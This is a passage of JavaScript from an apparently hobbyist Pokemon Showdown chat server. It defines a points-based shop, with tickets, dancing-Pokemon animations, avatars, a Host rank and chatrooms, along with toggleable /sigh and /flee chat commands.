        '<td>1 Ticket</td>'+
        '<td>tkt</td>'+
        '</tr>'+
        '<tr>'+
        '<td>Ticket Reel</td>'+
        '<td>475 BP</td>'+
        '<td>A reel of Tickets (Save 5%!)</td>'+
        '<td>10 Tickets</td>'+
        '<td>reel</td>'+
        '</tr>'+
        '<td>Ticket Box</td>'+
        '<td>2250 BP</td>'+
        '<td>A box of Tickets (Save 10%!)</td>'+
        '<td>50 Tickets</td>'+
        '<td>box</td>'+
        '</tr>'+
		'<tr>'+
        '<td>Ticket Chest</td>'+
        '<td>4250 BP</td>'+
        '<td>A chest of Tickets (Save 15%!)</td>'+
        '<td>100 Tickets</td>'+
        '<td>chest</td>'+
        '</tr>'+
		'<tr>'+
        '<td>Ticket Truck</td>'+
        '<td>40,000 BP</td>'+
        '<td>A TRUCKLOAD OF TICKETS! (Save 20%!)</td>'+
        '<td>1000 Tickets</td>'+
        '<td>truck</td>'+
        '</tr>'+

		'<tr>'+
        '<td>Random Message</td>'+
        '<td>5,000 BP</td>'+
        '<td>A Fortune Cookie containing a random message.</td>'+
        '<td>1 Cookie</td>'+
        '<td>msg</td>'+
        '</tr>'+
		
		'<tr>'+
        '<td>Dancing Wobbuffets</td>'+
        '<td>10,000 BP</td>'+
        '<td>Get funky.</td>'+
        '<td>1 Boy Band</td>'+
        '<td>lol</td>'+
        '</tr>'+
        
        '<tr>'+
        '<td>Dancing Trapinch</td>'+
        '<td>10,000 BP</td>'+
        '<td>A dancing Trapinch.</td>'+
        '<td>1 Trapinch</td>'+
        '<td>trap</td>'+
        '</tr>'+
		
        '<tr>'+
        '<td>Custom Avatar</td>'+
        '<td>15,000 BP</td>'+
        '<td>A custom avatar sized 80px x 80px</td>'+
        '<td>1 Custom Avatar</td>'+
        '<td>ava</td>'+
        '</tr>'+
		
		'<tr>'+
        '<td>Host</td>'+
        '<td>150,000 BP</td>'+
        '<td>A promotion to Host. For more details, use /groups.</td>'+
        '<td>1 Host</td>'+
        '<td>host</td>'+
        '</tr>'+
		
		'<tr>'+
        '<td>Chatroom</td>'+
        '<td>200,000 BP</td>'+
        '<td>A chatroom of your very own. (Not to be used for stupid things.)</td>'+
        '<td>1 Chatroom</td>'+
        '<td>room</td>'+
        '</tr>'+
        '</table>'+
		'To buy an item, use /buy [ID]. For more information about BP, use /moneyintro.');
},
buy: function(target, room, user) {
                var match = false;
                
               
               if (target == 'msg') {
                        match = true;
                        if (user.moneh < 5000) {
                            return this.sendReply('You do not have enough Battle Points to buy an Awesome Message. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 5000) {
                        user.moneh -= 5000;
                        user.prewritemoney();
                        Users.exportUserwealth();
                   Rooms.rooms.lobby.addRaw(getRandMessage(user));
                    }
                                }
						
				if (target === 'host') {
                        match = true;
                        if (user.moneh < 150000) {
                                return this.sendReply('You do not have enough Battle Points to buy Host.');
                        }
                        if (user.group === "+" || user.group === "$" || user.group === "*" || user.group === "%" || user.group === "@" || user.group === "&" || user.group === "~") {
                                return this.sendReply('You already have Voice or above. Go away.');
                        }
                        else if (user.moneh >= 150000)
                        this.sendReply('You are now officially a Host. Welcome to the team!');
                        user.group = "$";
                        user.updateIdentity();
                        user.moneh -= 150000;
                       	user.prewritemoney();
                        Users.exportUserwealth();
                        }
                
                        if (target === 'tkt') {
                        match = true;
                        if (user.moneh < 50) { //here
                            return this.sendReply('You do not have enough Battle Points to buy a ticket. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 50)
                        { 
                        this.sendReply('You have purchased a ticket.');
                        user.moneh -= 50;
                        user.tickets += 1;
                        user.prewritemoney();
                        Users.exportUserwealth();
                        }
                        
                }                  
                if (target == 'reel') {
                        match = true;
                        if (user.moneh < 475) {
                            return this.sendReply('You do not have enough Battle Points to buy a ticket reel. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 475) {
                        this.sendReply('You have purchased a ticket reel which contains 10 tickets! You saved 10%!');
                        user.moneh -= 475;
                        user.tickets += 10;
                        user.prewritemoney();

                        Users.exportUserwealth();
                                        }
                }
                if (target == 'chest') {
                        match = true;
                        if (user.moneh < 4250) {
                            return this.sendReply('You do not have enough Battle Points to buy a ticket chest. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 4250) {
                        this.sendReply('You have purchased a ticket chest which contains 100 tickets! You saved 20%!');
                        user.moneh -= 4250;
                        user.tickets += 100;
                        user.prewritemoney();
                        Users.exportUserwealth();
                                        }
                                }
								
				if (target == 'truck') {
                        match = true;
                        if (user.moneh < 40000) {
                            return this.sendReply('You do not have enough Battle Points to buy a ticket truck. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 40000) {
                        this.sendReply('You have purchased a TRUCKLOAD OF TICKETS!! 1000 TICKETS AT YOUR DISPOSAL!');
                        user.moneh -= 40000;
                        user.tickets += 1000;
                        user.prewritemoney();
                        Users.exportUserwealth();
                                        }
                                }
								
                if (target === 'box') {
                        match = true;
                        if (user.moneh < 2250) {
                                return this.sendReply('You do not have enough Battle Points to buy a ticket box. Earn some by winning tournaments and roulettes.');
                        }
 
                        if (user.moneh >= 2250) {
                            this.sendReply('You have purchased a ticket box of 50 tickets! You saved 15%!');
                            user.moneh -= 2250;
                            user.tickets += 50;
                            user.prewritemoney();
                            Users.exportUserwealth();
                            return item = false;
                        		}
						}  
						                
                if (target == 'room') {
                        match = true;
                        if (user.moneh < 200000) {
                            return this.sendReply('You do not have enough Battle Points to purchase a chatroom. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 200000) {
                        user.moneh -= 200000;
                        user.cav = true;
                        user.prewritemoney();
                        Users.exportUserwealth();
                        room.addRaw('<font size=2><b>'+user.name+' has purchased a Chatroom!</b></font size>')
                        return this.sendReply('You have purchased a chatroom! Talk to one of the Admins to get it! (NOTE: This chatroom must be appropiate.)');
                    }
                                }
				if (target == 'lol') {
                        match = true;
                        if (user.moneh < 10000) {
                            return this.sendReply('You do not have enough swag to get jam with the Wobbuffets. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 10000) {
                        user.moneh -= 10000;
                        user.cav = true;
                        user.prewritemoney();
                        Users.exportUserwealth();
                        room.addRaw('<marquee behavior="alternate" scrollamount="3"><b><img src=http://i196.photobucket.com/albums/aa279/loganknightphotos/wobbuffet-2.gif>WOBB<img src=http://i196.photobucket.com/albums/aa279/loganknightphotos/wobbuffet-2.gif>WOBB<img src=http://i196.photobucket.com/albums/aa279/loganknightphotos/wobbuffet-2.gif></b></marquee>')
						room.addRaw('<b>'+user.name+' made the dance floor hot!</b>')
                        return this.sendReply('Get funky!');
                    }
                                }
                                if (target == 'trap') {
                        match = true;
                        if (user.moneh < 10000) {
                            return this.sendReply('You do not have enough BP to get jam with assorted Pokemon. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 10000) {
                        user.moneh -= 10000;
                        user.cav = true;
                        user.prewritemoney();
                        Users.exportUserwealth();
                        room.addRaw('<center><img src=http://the-pokemon-world.wikispaces.com/file/view/th_Dance.gif/218103132/th_Dance.gif></center>')
						room.addRaw('<marquee behavior="alternate" scrollamount="2"><b>'+user.name+' started a party with Trapinch!</b></marquee>')
                        return this.sendReply('Bust your moves!');
                    }
                                }
                if (target == 'ava') {
                        match = true;
                        if (user.moneh < 15000) {
                            return this.sendReply('You do not have enough Battle Points to buy a Custom Avatar. Earn some by winning tournaments and roulettes.');
                        }
                        else if (user.moneh >= 15000) {
                        user.moneh -= 15000;
                        user.cav = true;
                        user.prewritemoney();
                        Users.exportUserwealth();
                        room.addRaw('<font size=2><b>'+user.name+' has purchased a Custom Avatar!</b></font size>')
                        return this.sendReply('You have purchased a custom avatar! use /av to get it ^_^');
                    }
                                }
                if (match == false) {
                    return this.sendReply('That isn\'t an item. Type /shop to see the list of items and to use the ID.')
                }
}, 

sigh: function(target, room, user) {
if (!this.canTalk()) {
return this.sendReply('you cannot sigh because you are muted or locked');
} else if (sigh === false) {
return this.sendReply('It is too good of a time to sigh.');
} else if (sigh === true) {
 this.add(user.name+ " sighs.");
}
         },
         
         
         fleeon: function(target, room, user) {
if (!user.can('mute')) {
return this.sendReply('You do not have the authority to use this command.');
}
else {
if (sigh === true) { //here you reference the variable "sigh"
return this.sendReply('/flee is already on.');
}
if (sigh === false) { // as well as here
this.sendReply('You turned on /flee.');

sigh = true; 
}
}
},


fleeoff: function(target, room, user) {
if (!user.can('mute')){
return this.sendReply('flee is now off.');
}
else {
if (sigh === false) { 
return this.sendReply('o3o why u wanan leave jw.');
}
if (sigh === true) {
this.sendReply('flee is nao off.');
sigh = false;
}
}
},

flee: function(target, room, user) {
if (!this.canTalk()) {
return this.sendReply('you cannot sigh because you are muted or locked');
} else if (sigh === false) {
return this.sendReply('pls dun go.');
} else if (sigh === true) {
 this.add(user.name+ " flees.");
}
         },
	
};
